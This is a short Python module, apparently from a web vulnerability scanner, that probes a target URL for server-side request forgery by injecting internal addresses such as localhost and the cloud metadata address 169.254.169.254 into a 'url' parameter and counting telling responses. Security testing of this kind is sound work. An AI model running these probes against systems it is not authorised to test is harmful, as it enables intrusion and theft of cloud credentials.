import requests

def run(target):
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",
        "http://internal/admin",
        "http://[::1]"
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            url = f"{target}?url={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if "ECONNREFUSED" in r.text or "metadata" in r.text or "internal" in r.text:
                hits += 1
            if payload in r.text:
                reflections += 1
        except:
            continue

    return {
        "module": "fuzz_ssrf",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Basic SSRF test"
    }
